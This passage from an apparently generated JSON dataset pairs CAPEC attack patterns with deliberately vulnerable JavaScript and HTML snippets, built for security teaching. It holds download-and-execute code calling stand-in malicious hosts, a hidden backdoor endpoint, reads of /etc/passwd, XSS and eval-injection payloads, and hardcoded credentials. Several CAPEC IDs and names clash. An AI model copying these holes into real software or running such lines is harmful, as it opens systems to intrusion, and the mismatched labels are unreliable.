        "description": "This JavaScript code snippet demonstrates a vulnerable function that downloads and executes code from a given URL without performing any integrity checks. The `fetch` function is used to download the code as text, and the `eval` function is used to execute the downloaded code. This embodies the main idea of CAPEC-193 (Malicious Software Download) by showing how an attacker could use deceptive methods to cause a user or an automated process to download and execute dangerous code from an attacker-controlled source. The use of `eval` without verifying the origin and integrity of the code directly relates to CWE-494 (Download of Code Without Integrity Check)."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nconst downloadAndUpdate = (url, dest) => {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close(() => {\n        require(dest); // Execute the downloaded file\n      });\n    });\n  }).on('error', (err) => {\n    fs.unlink(dest);\n    console.error('Download failed:', err.message);\n  });\n};\n\ndownloadAndUpdate('http://malicious.example.com/update.js', 'update.js');",
        "description": "This JavaScript code snippet demonstrates a vulnerable software update mechanism. It downloads a file from a specified URL and executes it without verifying the origin or integrity of the code. This embodies the CAPEC 'Malicious Software Update' by showing how an adversary could trick a user or automated process into downloading and running malicious code. The code also touches on CWE-494 (Download of Code Without Integrity Check) by not verifying the downloaded file, CWE-506 (Embedded Malicious Code) by potentially executing harmful code, and CWE-507 (Trojan Horse) by hiding malicious functionality within what appears to be a legitimate update."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nfunction downloadUpdate(url, dest, cb) {\n  const file = fs.createWriteStream(dest);\n  http.get(url, (response) => {\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close(cb);\n    });\n  }).on('error', (err) => {\n    fs.unlink(dest);\n    if (cb) cb(err.message);\n  });\n}\n\n// URL of the update server (potentially malicious)\nconst updateUrl = 'http://malicious-server.com/update.exe';\nconst destination = '/path/to/update.exe';\n\ndownloadUpdate(updateUrl, destination, (err) => {\n  if (err) {\n    console.error('Download failed:', err);\n  } else {\n    console.log('Update downloaded successfully');\n    // Execute the downloaded update without integrity check\n    require('child_process').exec(destination, (error, stdout, stderr) => {\n      if (error) {\n        console.error(`Execution error: ${error}`);\n        return;\n      }\n      console.log(`stdout: ${stdout}`);\n      console.error(`stderr: ${stderr}`);\n    });\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable automated software update mechanism. The `downloadUpdate` function downloads an update from a specified URL and saves it to a destination path. The URL points to a potentially malicious server, and the downloaded file is executed without any integrity or authenticity checks. This embodies the CAPEC 'Malicious Automated Software Update via Redirection' by showing how an attacker can exploit the lack of proper server authentication and integrity validation. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is shown by the absence of any verification of the downloaded file, CWE-294 (Authentication Bypass by Capture-replay) is implied by the lack of secure server authentication, and CWE-807 (Reliance on Untrusted Inputs in a Security Decision) is demonstrated by the use of an untrusted URL for the update."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "const crypto = require('crypto');\n\n// Using a weak cryptographic algorithm (CWE-327)\nconst algorithm = 'des-ecb'; // DES is considered weak\nconst key = crypto.randomBytes(8); // DES key size\nconst plaintext = 'Sensitive Information';\n\n// Encrypting the plaintext\nconst cipher = crypto.createCipheriv(algorithm, key, null);\nlet encrypted = cipher.update(plaintext, 'utf8', 'hex');\nencrypted += cipher.final('hex');\nconsole.log('Encrypted:', encrypted);\n\n// Exposing sensitive system information (CWE-497)\nconsole.log('Encryption Key:', key.toString('hex'));\n\n// Undocumented feature (CWE-1242)\nfunction undocumentedFeature() {\n  console.log('This is an undocumented feature.');\n}\nundocumentedFeature();\n\n// Security-critical code that might be optimized away (CWE-1037)\nif (process.env.NODE_ENV === 'production') {\n  // Security check that might be optimized away\n  console.log('Security check in production mode');\n}",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to reverse engineering. It uses a weak cryptographic algorithm (DES) to encrypt sensitive information, which can be easily broken (CWE-327). It then exposes the encryption key, which is sensitive system information, to unauthorized actors via console output (CWE-497). The code also includes an undocumented feature, which can serve as an entry point for attackers (CWE-1242). Finally, it contains a security-critical check that might be optimized away by the processor in production mode, potentially removing the security mechanism (CWE-1037). This snippet embodies the main idea of reverse engineering by showcasing how various weaknesses can be exploited to understand and potentially compromise the system."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "function authenticate(userInput) {\n  const secretToken = 's3cr3t';\n  let isAuthenticated = false;\n  if (userInput === secretToken) {\n    isAuthenticated = true;\n  }\n  console.log(isAuthenticated ? 'Access granted' : 'Access denied');\n  return isAuthenticated;\n}\n\n// Simulate power consumption logging\nfunction logPowerConsumption() {\n  const powerConsumption = Math.random() * 100;\n  console.log(`Power consumption: ${powerConsumption}W`);\n  return powerConsumption;\n}\n\n// Example usage\nconst userInput = 'userInputToken';\nauthenticate(userInput);\nlogPowerConsumption();",
        "description": "This JavaScript code snippet demonstrates a simple authentication mechanism that is vulnerable to black box reverse engineering and side-channel attacks. The `authenticate` function checks if the user input matches a secret token and logs whether access is granted or denied. The `logPowerConsumption` function simulates logging of power consumption, which could be monitored by an attacker to infer the secret token based on power usage patterns. This example embodies the CAPEC concept of black box reverse engineering by showing how observable discrepancies and side-channel information can be exploited to reverse engineer the authentication mechanism."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// Hidden functionality: Undocumented backdoor\nfunction hiddenBackdoor(req, res) {\n  if (req.url === '/hidden' && req.method === 'GET') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hidden functionality accessed');\n  }\n}\n\n// Download code without integrity check\nfunction downloadAndExecute(url) {\n  http.get(url, (response) => {\n    let data = '';\n    response.on('data', (chunk) => { data += chunk; });\n    response.on('end', () => {\n      eval(data); // Dangerous: executing downloaded code without integrity check\n    });\n  });\n}\n\n// Expose sensitive system information\nfunction exposeSensitiveInfo(req, res) {\n  if (req.url === '/sensitive' && req.method === 'GET') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(`System Info: ${process.env.PATH}`); // Exposing sensitive system information\n  }\n}\n\nconst server = http.createServer((req, res) => {\n  hiddenBackdoor(req, res);\n  exposeSensitiveInfo(req, res);\n});\n\nserver.listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n  // Download and execute code from a remote location\n  downloadAndExecute('http://example.com/malicious.js');\n});",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC description of reverse engineering an executable to expose hidden functionality. The code includes a hidden backdoor that can be accessed via a specific URL, which represents CWE-912 (Hidden Functionality). It also downloads and executes code from a remote location without verifying its integrity, representing CWE-494 (Download of Code Without Integrity Check). Additionally, it exposes sensitive system information through an HTTP endpoint, representing CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The code is designed to be concise and illustrate the main points of the CAPEC and related CWEs."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "const SECRET_KEY = 'hardcoded_secret_key';\n\nfunction authenticate(user, password) {\n    const hardcodedUser = 'admin';\n    const hardcodedPassword = 'password123';\n    if (user === hardcodedUser && password === hardcodedPassword) {\n        return 'Authentication successful';\n    } else {\n        return 'Authentication failed';\n    }\n}\n\nconsole.log(authenticate('admin', 'password123'));",
        "description": "This JavaScript code snippet demonstrates the concept of 'Read Sensitive Constants Within an Executable' by including hard-coded sensitive information such as a secret key and credentials directly within the code. The `SECRET_KEY` variable and the hardcoded credentials within the `authenticate` function are examples of CWE-798 (Use of Hard-coded Credentials) and CWE-547 (Use of Hard-coded, Security-relevant Constants). This code is vulnerable because an adversary can easily extract these hard-coded values through static or dynamic analysis, leading to potential security breaches."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n    console.log('Connected');\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    client.write('username=admin&password=admin123');\n});\n\nclient.on('data', (data) => {\n    console.log('Received: ' + data);\n    client.destroy(); // kill client after server's response\n});\n\nclient.on('close', () => {\n    console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a simple TCP client that connects to a server and transmits sensitive information (username and password) in cleartext. This embodies the main idea of CAPEC-272 (Protocol Analysis) by showing how an adversary could analyze the protocol to intercept sensitive data. The code also highlights CWE-319 (Cleartext Transmission of Sensitive Information) as it sends the credentials without encryption, making it vulnerable to sniffing attacks. The code is concise and represents the potential risks associated with inadequate encryption and cleartext transmission in network protocols."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "const http = require('http');\nconst url = require('url');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = queryObject.file;\n\n  if (filePath) {\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/plain'});\n        res.write('File not found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/html'});\n        res.write(data);\n      }\n      res.end();\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.write('No file specified');\n    res.end();\n  }\n}).listen(8080);",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js. The server reads a file specified by the 'file' query parameter in the URL and returns its contents. The code does not properly sanitize or validate the 'file' parameter, allowing an attacker to specify any file path, potentially leading to remote file inclusion vulnerabilities. This embodies the main idea of the CAPEC by demonstrating how improper control of file paths can lead to arbitrary code execution. The related CWEs are represented by the lack of input validation (CWE-98), potential for XSS if the file contains malicious scripts (CWE-80), reliance on file names (CWE-646), and the risk of exposing raw web content (CWE-433)."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  // Improper Authentication: No verification of the source\n  if (req.url === '/data' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      // Improper Verification of Source of a Communication Channel\n      const data = JSON.parse(body);\n      if (data.user === 'admin') {\n        // Authentication Bypass by Spoofing\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.end('Access granted to admin data');\n      } else {\n        res.writeHead(403, {'Content-Type': 'text/plain'});\n        res.end('Access denied');\n      }\n    });\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for POST requests to the '/data' endpoint. The server does not properly authenticate the source of the request, leading to potential security vulnerabilities. Specifically, it checks if the 'user' field in the JSON body is 'admin' without verifying the authenticity of the request. This can allow an attacker to spoof the 'user' field and gain unauthorized access to admin data. The code demonstrates vulnerabilities related to Improper Authentication (CWE-287), Improper Verification of Source of a Communication Channel (CWE-940), and Authentication Bypass by Spoofing (CWE-290)."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\n// Middleware to simulate weak authentication\napp.use((req, res, next) => {\n  const user = req.headers['x-user'];\n  if (!user) {\n    return res.status(401).send('Authentication required');\n  }\n  req.user = user;\n  next();\n});\n\n// Endpoint that can be spoofed\napp.get('/data', (req, res) => {\n  if (req.user === 'admin') {\n    return res.send('Sensitive data for admin');\n  }\n  res.send('Public data');\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}`);\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that demonstrates a Principal Spoof vulnerability. The middleware checks for a user identity in the request headers but does not verify its authenticity, representing CWE-1390 (Weak Authentication). An attacker can easily spoof the 'x-user' header to impersonate an admin and access sensitive data, embodying the main idea of CAPEC-Principal Spoof. The code also reflects CWE-290 (Authentication Bypass by Spoofing) as it allows bypassing authentication by simply adding a header."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "const crypto = require('crypto');\n\n// Weak session token generation\nfunction generateSessionToken(userId) {\n  // Using a weak credential (userId) and a predictable pattern\n  const token = `${userId}-${Date.now()}`;\n  return crypto.createHash('sha256').update(token).digest('hex');\n}\n\n// Simulating session fixation vulnerability\nfunction authenticateUser(userId, sessionToken) {\n  // Improper control of session lifecycle\n  if (sessionToken) {\n    console.log('Session already exists. Reusing session token:', sessionToken);\n    return sessionToken;\n  }\n  // Generate a new session token\n  const newToken = generateSessionToken(userId);\n  console.log('New session token generated:', newToken);\n  return newToken;\n}\n\n// Example usage\nconst userId = 'user123';\nlet sessionToken = null;\n\n// First authentication\nsessionToken = authenticateUser(userId, sessionToken);\n\n// Subsequent authentication without invalidating the old session\nsessionToken = authenticateUser(userId, sessionToken);",
        "description": "This JavaScript code snippet demonstrates a vulnerable session management system. The `generateSessionToken` function creates a session token using a weak credential (userId) and a predictable pattern (current timestamp), which can be easily guessed or forged by an attacker. The `authenticateUser` function simulates a session fixation vulnerability by reusing an existing session token if it is provided, without invalidating the old session. This allows an attacker to potentially hijack or forge session credentials. The code embodies the main idea of CAPEC-61 (Session Credential Falsification through Forging) and highlights related CWEs such as CWE-384 (Session Fixation), CWE-1391 (Use of Weak Credentials), and CWE-664 (Improper Control of a Resource Through its Lifetime)."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "function expandData(input) {\n  let expanded = input;\n  for (let i = 0; i < 10; i++) {\n    expanded = expanded.repeat(2); // Exponential expansion\n  }\n  return expanded;\n}\n\nconst inputData = 'a';\nconsole.log(expandData(inputData));",
        "description": "This JavaScript code snippet demonstrates the concept of Exponential Data Expansion. The function `expandData` takes an input string and exponentially expands it by repeatedly doubling its size in a loop. This can lead to excessive memory and CPU usage, especially if the input is large or the loop runs many times. This example embodies the main idea of CAPEC-230, where an adversary can exploit such a function to cause resource exhaustion. The related CWEs are represented as follows: CWE-770 (no limits on resource allocation), CWE-776 (improper handling of recursive expansions), CWE-1093 (complex data representation), and CWE-1043 (large number of non-primitive elements)."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "<!DOCTYPE html>\n<html>\n<head>\n    <title>Error Page</title>\n</head>\n<body>\n    <h1>Error</h1>\n    <p id=\"errorMessage\"></p>\n    <script>\n        // Simulate receiving a malformed request with exploit code\n        var userInput = decodeURIComponent(window.location.search.substring(1));\n        // Improper neutralization of input\n        document.getElementById('errorMessage').innerHTML = userInput;\n    </script>\n</body>\n</html>",
        "description": "This code snippet represents a vulnerable error page that improperly handles user input, leading to a potential XSS attack. The script simulates receiving a malformed request with exploit code via the URL query string. The user input is directly inserted into the error message element without proper neutralization, making the page susceptible to XSS attacks. This example embodies the CAPEC 'XSS Targeting Error Pages' and highlights related CWEs such as improper neutralization of script in error messages (CWE-81), basic XSS (CWE-80), and incomplete denylist to XSS (CWE-692)."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "const userInput = '<ScRiPt>alert(\"XSS Attack!\")</ScRiPt>';\nconst sanitizedInput = userInput.replace(/<script>/gi, '');\ndocument.body.innerHTML = sanitizedInput;",
        "description": "This JavaScript code snippet demonstrates a vulnerability to XSS attacks using alternate syntax. The user input contains a script tag with mixed case letters ('<ScRiPt>'), which is a common technique to bypass case-sensitive filters. The sanitization step attempts to remove script tags by replacing '<script>' with an empty string, but it fails to account for alternate forms of the tag. As a result, the malicious script is executed when the sanitized input is inserted into the DOM. This example highlights the importance of comprehensive input validation and neutralization to prevent XSS attacks, as described in the CAPEC and related CWEs."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "function processInput(input) {\n  // Input filter removed\n  // var filteredInput = input.replace(/[^a-zA-Z0-9]/g, '');\n  return eval(input); // CWE-74: Injection vulnerability\n}\n\n// Example usage\nvar userInput = \"alert('Hacked!');\";\nprocessInput(userInput);",
        "description": "This JavaScript code snippet demonstrates the removal of an input filter, which is a key aspect of the CAPEC described. The `processInput` function is intended to process user input. Originally, it had a filter to remove non-alphanumeric characters (commented out), but this filter has been removed, making the application vulnerable. The function then uses `eval` to execute the input directly, which is a classic example of CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component). This can lead to code injection attacks. The example usage shows how an attacker could exploit this vulnerability by injecting a malicious script."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "const fs = require('fs');\nconst xml2js = require('xml2js');\n\nconst xmlData = `\n<root>\n  <externalEntity SYSTEM \"file:///etc/passwd\">\n    &externalEntity;\n  </externalEntity>\n</root>`;\n\nxml2js.parseString(xmlData, { xmlMode: true }, (err, result) => {\n  if (err) {\n    console.error('Error parsing XML:', err);\n  } else {\n    console.log('Parsed XML:', result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). The code uses the 'xml2js' library to parse an XML string that includes an external entity reference to a local file ('/etc/passwd'). The parser does not validate or restrict the external entity, allowing an adversary to access sensitive system files. This example embodies CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-502 (Deserialization of Untrusted Data), highlighting the risks of processing untrusted serialized data without proper validation."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n  console.log('Connected to server');\n  // Bypassing client-side authentication\n  client.write(JSON.stringify({ action: 'authenticate', token: 'malicious_token' }));\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // Injecting malicious code\n  client.write(JSON.stringify({ action: 'execute', command: 'malicious_command' }));\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a malicious client application that connects to a server and bypasses client-side authentication by sending a fake token. Once connected, it injects a malicious command to be executed by the server. This embodies the CAPEC 'Create Malicious Client' by violating the server's assumptions about client behavior. The code also reflects CWE-603 (Use of Client-Side Authentication) by bypassing authentication, CWE-506 (Embedded Malicious Code) by injecting harmful commands, and CWE-507 (Trojan Horse) by appearing to perform legitimate actions while executing hidden malicious operations."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "const { exec } = require('child_process');\n\n// Vulnerable function to modify Windows Registry\nfunction modifyRegistry(key, value) {\n  const command = `reg add ${key} /v ${value.name} /t ${value.type} /d ${value.data} /f`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nmodifyRegistry('HKCU\\Software\\ExampleApp', { name: 'Config', type: 'REG_SZ', data: 'malicious_data' });",
        "description": "This JavaScript code snippet demonstrates a function that modifies the Windows Registry using the `reg add` command. The `modifyRegistry` function takes a registry key and a value object as parameters and constructs a command to add or modify a registry entry. The `exec` function from the `child_process` module is used to execute the command. This code embodies the CAPEC idea of manipulating registry information to potentially hide configuration changes or remove indicators of compromise. The related CWEs are represented by the external control of system settings (CWE-15) and the potential for storing sensitive information in cleartext (CWE-314). The code is vulnerable because it allows external input to control system configuration without proper validation or integrity checks."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "const sensitiveData = 'user_password';\n\n// Store sensitive data in local storage (cache)\nlocalStorage.setItem('cachedData', sensitiveData);\n\n// Function to retrieve sensitive data from cache\nfunction getCachedData() {\n  return localStorage.getItem('cachedData');\n}\n\n// Simulate an attacker accessing the cache\nconsole.log('Retrieved from cache:', getCachedData());",
        "description": "This JavaScript code snippet demonstrates a vulnerability where sensitive information, such as a user's password, is stored in the browser's local storage (cache) without encryption. The `localStorage.setItem` method is used to store the sensitive data, and the `localStorage.getItem` method retrieves it. This represents the CAPEC 'Lifting Sensitive Data Embedded in Cache' by showing how an attacker could easily access sensitive information if it is not properly protected. The code also highlights CWE-524 (Use of Cache Containing Sensitive Information) and CWE-311 (Missing Encryption of Sensitive Data) by storing and retrieving sensitive data in an unprotected manner."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "const credentials = { username: 'admin', password: 'password123' }; \n\nfunction authenticate() { \n  if (credentials.username === 'admin' && credentials.password === 'password123') { \n    console.log('Authentication successful'); \n  } else { \n    console.log('Authentication failed'); \n  } \n} \n\nauthenticate();",
        "description": "This JavaScript code snippet demonstrates a vulnerable approach to handling authentication by embedding credentials directly within the client-side code. The `credentials` object contains hardcoded sensitive data (username and password), which can be easily extracted by an attacker. The `authenticate` function checks these hardcoded credentials to determine if authentication is successful. This example embodies the main idea of CAPEC-37 (Retrieve Embedded Sensitive Data) and highlights related CWEs such as CWE-522 (Insufficiently Protected Credentials) and CWE-603 (Use of Client-Side Authentication). The code is vulnerable because it stores sensitive data insecurely and performs authentication on the client side, making it susceptible to interception and modification."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "const fs = require('fs');\nconst crypto = require('crypto');\n\n// Hard-coded credentials (CWE-798)\nconst privateKey = fs.readFileSync('path/to/private/key.pem', 'utf8');\nconst maliciousCode = fs.readFileSync('path/to/malicious/code.js', 'utf8');\n\n// Sign the malicious code\nconst sign = crypto.createSign('SHA256');\nsign.update(maliciousCode);\nsign.end();\nconst signature = sign.sign(privateKey, 'hex');\n\n// Save the signed malicious code (CWE-506)\nfs.writeFileSync('path/to/signed/malicious/code.js', `${maliciousCode}\n// Signature: ${signature}`);\n\nconsole.log('Malicious code signed and saved.');",
        "description": "This JavaScript code snippet demonstrates the concept of 'Signing Malicious Code' (CAPEC). It uses hard-coded credentials (CWE-798) to read a private key and sign a piece of malicious code. The signed malicious code is then saved to a file, which could deceive users or systems into believing the code is legitimate and from a trusted source. This snippet highlights the risk of incorrect permission assignment (CWE-732) and the potential for embedded malicious code (CWE-506)."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "function authenticateUser(username, password) {\n  // Client-side authentication (CWE-603)\n  if (username === 'admin' && password === 'password123') {\n    return true;\n  }\n  return false;\n}\n\nfunction performSensitiveAction() {\n  if (authenticateUser(prompt('Username:'), prompt('Password:'))) {\n    // Client-side enforcement of server-side security (CWE-602)\n    alert('Sensitive action performed!');\n  } else {\n    alert('Authentication failed!');\n  }\n}\n\n// Removing important client functionality (CAPEC-160)\n// An attacker can bypass the authentication by modifying the client-side code\nperformSensitiveAction();",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of client-side authentication and security enforcement. The `authenticateUser` function performs authentication on the client side (CWE-603), and the `performSensitiveAction` function relies on this client-side authentication to perform a sensitive action (CWE-602). An attacker can easily bypass the authentication by modifying the client-side code, such as removing or altering the `authenticateUser` function, thus removing important client functionality that the server assumes to be present and trustworthy (CAPEC-160). This example highlights the risks of relying on client-side mechanisms for security decisions."
    },
    {
        "capec_id": "208",
        "capec_name": "Removing/short-circuiting 'Purse' logic: removing/mutating 'cash' decrements",
        "code_snippet": "function calculateTotalCost(price, quantity) {\n  // Client-side calculation of total cost\n  return price * quantity;\n}\n\n// Example usage\nlet price = 100; // Price per item\nlet quantity = 5; // Number of items\n\n// Attacker modifies the quantity before sending to server\nquantity = 1; // Attacker changes quantity to 1\n\nlet totalCost = calculateTotalCost(price, quantity);\n\n// Send the manipulated total cost to the server\nsendToServer(totalCost);\n\nfunction sendToServer(totalCost) {\n  // Simulate sending data to the server\n  console.log('Total cost sent to server:', totalCost);\n}",
        "description": "This JavaScript code snippet demonstrates a client-side calculation of the total cost of items, which is then sent to the server. The function `calculateTotalCost` multiplies the price per item by the quantity of items. An attacker can manipulate the quantity variable before the total cost is calculated and sent to the server, resulting in an incorrect total cost being sent. This embodies the CAPEC of removing or short-circuiting 'purse' logic by modifying client-side calculations. The related CWEs are represented by the reliance on client-side enforcement (CWE-602), incorrect calculation (CWE-682), and improper validation of input (CWE-1284)."
    },
    {
        "capec_id": "209",
        "capec_name": "XSS Using MIME Type Mismatch",
        "code_snippet": "<html>\n<head>\n    <title>Test Page</title>\n</head>\n<body>\n    <img src=\"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA\n    AAAFCAYAAACNbyblAAAAHElEQVQI12P4\n    //8/w38GIAXDIBKE0DHxgljNBAAO\n    9TXL0Y4OHwAAAABJRU5ErkJggg==\" onerror=\"alert('XSS')\">\n</body>\n</html>",
        "description": "This HTML snippet demonstrates a Cross-Site Scripting (XSS) attack using MIME type mismatch. The 'img' tag's 'src' attribute is set to a base64-encoded PNG image. However, the 'onerror' attribute contains JavaScript code that will execute if the image fails to load. This leverages CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page) and CWE-84 (Improper Neutralization of Encoded URI Schemes in a Web Page). The MIME type mismatch occurs because the browser may interpret the base64 data as an image, but the 'onerror' script executes if the image fails to load, leading to potential XSS vulnerabilities."
    },
    {
        "capec_id": "211",
        "capec_name": "DEPRECATED: Leveraging web tools (e.g. Mozilla's GreaseMonkey, Firebug) to change application behavior",
        "code_snippet": "document.querySelectorAll('img').forEach(img => { img.src = 'javascript:alert(\"XSS\")'; });",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page). The code selects all <img> elements on a web page and sets their 'src' attribute to a JavaScript URI that triggers an alert, effectively executing a cross-site scripting (XSS) attack. This embodies the deprecated CAPEC idea of leveraging web tools to change application behavior, as it shows how an attacker could manipulate the DOM to introduce malicious behavior. The code also indirectly touches on CWE-79 (Improper Neutralization of Input During Web Page Generation) by showing how user-controllable input (in this case, the 'src' attribute) can be exploited if not properly sanitized."
    },
    {
        "capec_id": "212",
        "capec_name": "Functionality Misuse",
        "code_snippet": "const fs = require('fs');\n\n// Function to read sensitive system information\nfunction readSensitiveInfo(filePath) {\n  try {\n    // Using low-level file system functionality to read a file\n    const data = fs.readFileSync(filePath, 'utf8');\n    console.log('Sensitive Information:', data);\n  } catch (err) {\n    console.error('Error reading file:', err);\n  }\n}\n\n// Undocumented feature: hidden endpoint to read sensitive info\nconst express = require('express');\nconst app = express();\n\napp.get('/hidden-endpoint', (req, res) => {\n  // Misuse of functionality to expose sensitive information\n  readSensitiveInfo('/etc/passwd');\n  res.send('Sensitive information has been logged.');\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a misuse of functionality by leveraging legitimate capabilities of an application to achieve a negative technical impact. The code includes an undocumented feature (CWE-1242) in the form of a hidden endpoint '/hidden-endpoint' that, when accessed, reads and logs sensitive system information from '/etc/passwd' using low-level file system functionality (CWE-695). This exposes sensitive system information to unauthorized users (CWE-497). The code represents the main idea of CAPEC-233 by showing how an adversary can misuse application functionality to access unauthorized, sensitive data."
    },
    {
        "capec_id": "213",
        "capec_name": "DEPRECATED: Directory Traversal",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst path = require('path');\n\nconst server = http.createServer((req, res) => {\n  const basePath = path.join(__dirname, 'public');\n  let filePath = path.join(basePath, req.url);\n\n  fs.readFile(filePath, (err, data) => {\n    if (err) {\n      res.writeHead(404, {'Content-Type': 'text/plain'});\n      res.end('File not found');\n    } else {\n      res.writeHead(200, {'Content-Type': 'text/html'});\n      res.end(data);\n    }\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running at http://127.0.0.1:3000/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server reads files from a 'public' directory based on the URL requested by the client. However, it is vulnerable to path traversal attacks because it directly uses the user-supplied URL to construct the file path without properly sanitizing it. An attacker could exploit this by requesting URLs with sequences like '/../', '....', '...', '/dir/../filename', or '.../...//' to access files outside the 'public' directory, potentially exposing sensitive information or system files. This code embodies the main idea of CAPEC-126 and related CWEs by demonstrating how improper handling of file paths can lead to security vulnerabilities."
    },
    {
        "capec_id": "214",
        "capec_name": "DEPRECATED: Fuzzing for garnering J2EE/.NET-based stack traces, for application mapping",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  try {\n    // Simulate a potential error\n    if (req.url === '/error') {\n      throw new Error('Simulated error');\n    }\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Hello, world!');\n  } catch (err) {\n    // Missing custom error page\n    res.writeHead(500, {'Content-Type': 'text/plain'});\n    res.end(err.stack); // Exposing stack trace\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://localhost:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server listens for incoming requests and simulates an error when the URL path is '/error'. When an error occurs, the server catches the exception and responds with a 500 status code, exposing the stack trace in the response. This demonstrates the vulnerability of exposing sensitive information through stack traces, which can aid attackers in application mapping. Additionally, the code lacks a custom error page, which is a misconfiguration that can lead to information exposure. This snippet embodies the main idea of the deprecated CAPEC by showing how improper error handling and missing custom error pages can expose sensitive information."
    },
    {
        "capec_id": "215",
        "capec_name": "Fuzzing for application mapping",
